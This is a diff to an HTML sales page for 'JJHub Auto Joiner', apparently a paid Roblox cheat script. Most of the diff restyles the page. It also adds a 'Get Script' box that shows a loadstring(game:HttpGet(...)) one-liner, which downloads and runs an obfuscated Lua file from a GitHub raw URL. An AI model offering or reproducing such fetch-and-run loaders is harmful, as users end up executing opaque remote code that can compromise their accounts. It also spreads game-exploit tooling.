@@ -16,7 +16,6 @@
       align-items: center;
       justify-content: center;
       height: 100vh;
-      overflow: hidden;
     }
 
     .container {
@@ -26,7 +25,7 @@
       border: 2px solid #00ffff;
       border-radius: 12px;
       box-shadow: 0 0 20px #00ffff;
-      max-width: 500px;
+      max-width: 600px;
     }
 
     h1 {
@@ -41,7 +40,7 @@
       color: #cccccc;
     }
 
-    .buy-button {
+    .buy-button, .script-button {
       background: linear-gradient(90deg, #00ffff, #0077ff);
       border: none;
       color: black;
@@ -50,10 +49,22 @@
       border-radius: 8px;
       cursor: pointer;
       transition: transform 0.2s ease;
+      margin: 0.5rem;
     }
 
-    .buy-button:hover {
+    .buy-button:hover, .script-button:hover {
       transform: scale(1.05);
+    }
+
+    .script-box {
+      margin-top: 1rem;
+      background: #111;
+      color: #0ff;
+      padding: 1rem;
+      border-radius: 8px;
+      font-family: monospace;
+      display: none;
+      white-space: pre-wrap;
     }
 
     .footer {
@@ -66,10 +77,14 @@
 <body>
   <div class="container">
     <h1>🚀 JJHub Auto Joiner</h1>
-    <p>Unlock instant server hopping and mythic execution. Purchase below to receive your script automatically.</p>
-    <a href="https://www.roblox.com/games/YOUR_GAME_ID" target="_blank">
+    <p>Buy the gamepass below to unlock the script instantly.</p>
+    <a href="https://www.roblox.com/game-pass/1451516545/JJHub-Auto-Joiner" target="_blank">
       <button class="buy-button">Buy with Robux</button>
     </a>
+    <button class="script-button" onclick="document.getElementById('scriptBox').style.display='block'">Get Script</button>
+    <div id="scriptBox" class="script-box">
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gilan80t/SAB/main/--%20Services-obfuscated.lua"))()
+    </div>
     <div class="footer">Powered by JJHub • Mythic Security • Cosmic UI</div>
   </div>
 </body>
